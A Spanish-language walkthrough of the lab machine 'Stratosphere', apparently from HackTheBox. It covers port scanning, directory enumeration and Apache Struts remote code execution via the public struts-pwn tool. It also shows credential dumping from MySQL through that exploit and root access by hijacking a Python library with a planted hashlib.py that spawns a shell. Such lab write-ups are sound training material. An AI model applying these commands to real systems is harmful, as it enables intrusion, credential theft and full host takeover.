-----
- Tags: #gobuster #searchsploit #action-file #mysql #mysqlshow #ssh #sudoers #pythonlibraryhijacking
------
# Resolución

## Reconocimiento

### OS

**LINUX**
```bash
ping -c 1 10.10.10.64
PING 10.10.10.64 (10.10.10.64) 56(84) bytes of data.
64 bytes from 10.10.10.64: icmp_seq=1 ttl=63 time=251 ms

--- 10.10.10.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 250.571/250.571/250.571/0.000 ms
```

-----
### OS

**LINUX**
```shell
ping -c 1 10.10.10.64
PING 10.10.10.64 (10.10.10.64) 56(84) bytes of data.
64 bytes from 10.10.10.64: icmp_seq=1 ttl=63 time=245 ms

--- 10.10.10.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 244.936/244.936/244.936/0.000 ms
```

### NMAP

**Puertos**
```js
# Nmap 7.94SVN scan initiated Mon Dec  2 19:24:57 2024 as: nmap -p- --open --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.10.64
Nmap scan report for 10.10.10.64
Host is up, received user-set (0.24s latency).
Scanned at 2024-12-02 19:24:57 -03 for 40s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Dec  2 19:25:37 2024 -- 1 IP address (1 host up) scanned in 40.02 seconds
```

**Servicios**
```js

```

### GOBUSTER

Se detecto mediante el siguiente comando de **``gobuster``** una directorio ubicado en el servidor **http** llamado **``Monitoring``** y otro llamado **``manager``**.

- **``gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.64 -b=404 --add-slash -t 100``**

El directorio ``Monitoring`` contiene un panel de **Login** en donde se aprecia la utilización de archivos con extensión **``.action``** dentro del URL.

- ``http://10.10.10.64/Monitoring/example/Welcome.action``

-----
## Explotación

### Exploit en Github

Se realizó una búsqueda en la web de **Github** para encontrar algún Exploit que abuse de archivos con extensión **``.action``**. Se encontró uno ubicado en el siguiente [repositorio](https://github.com/mazen160/struts-pwn) el cual abusa del *``Content-Type``* para conseguir un **RCE**.

![[ST 1.png]]

Se intentó detectar si herramientas como **``curl``** y **``wget``** funcionaban pero no fue el caso.

----

Realizando un ``ls`` a través del Exploit, se detectó un archivo llamado *``db_connect``* el cual posee credenciales de lo que parece una **base de datos** al utilizar un **``cat``** en el.

```shell
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```

Se realizó un **``which mysql``** para detectar si existía una base de datos *Mysql* dentro de la máquina víctima lo cual fue correcto.

Al no poseer una consola interactiva no se puede interactuar directamente con la base de datos ya que esta posee una interfaz interactiva, por lo tanto empleamos el uso de la herramienta **``mysqlshow``** la cual se encuentra instalada en el sistema.

Se proporcionan las credenciales recibidas en el archivo **``db_connect``**.

- **``./struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Login.action' -c "mysqlshow -uadmin -padmin"``**

![[ST 2.png]]

Se detectan **dos bases de datos**, ingreso a la que se llama **``users``** especificándolo en el **``mysqlshow``**.

-  **``./struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Login.action' -c "mysqlshow -uadmin -padmin users"``**

Luego se detecta una **tabla** llamada **``accounts``**, también se especifica en el comando.

- **``./struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Login.action' -c "mysqlshow -uadmin -padmin users accounts"``**

![[ST 3.png]]

Para listar el contenido de las columnas dejo de usar **``mysqlshow``** y empleo **``mysql``** pero esta vez con el parámetro **``-e``** que me permite colocar **Querys especificas**, esto se debe a que ya se la composición de la base de datos por completo.

- **``./struts-pwn.py -u 'http://10.10.10.64/Monitoring/example/Login.action' -c 'mysql -uadmin -padmin -e "select * from accounts" users'``**

![[ST 4.png]]

Haciendo **Fuzzing** de manera manual detecté que dichas credenciales pertenecen al usuario **``richard``** de la máquina víctima, por lo tanto como el **puerto 22** estaba abierto procedí a conectarme a través de el.

- **``ssh richard@10.10.10.64``**

--------
## Escalada de privilegios

### Python Library Hijacking

Al realizar un **``sudo -l``** detecté que podemos ejecutar un script de python llamado **``test.py``** con el binario ubicado en **``/usr/bin/python*``** como usuario ``root``, por lo tanto realicé lo siguiente.

Encontramos un archivo **``test.py``** en el directorio ``/home`` de ``richard``, noté que dicho script importa la librería **``hashlib.py``** por lo tanto aprovechándome de que **Python** por defecto **en primer instancia busca la librería en el directorio actual** y luego continúa con el PATH configurado procedemos a crear un archivo llamado **``hashlib.py``** en el directorio actual, luego le colocamos el siguiente código.

```python
import os
os.system("bash -p")
```

Por lo tanto una vez ejecutemos el script aprovechándonos del permiso a nivel **sudoers**, conseguiremos acceso como ``root``.

- **``sudo -u root /usr/bin/python /home/richard/test.py``**

![[ST 5.png]]

Por lo tanto de esta forma **completamos** la máquina **``Stratosphere``**.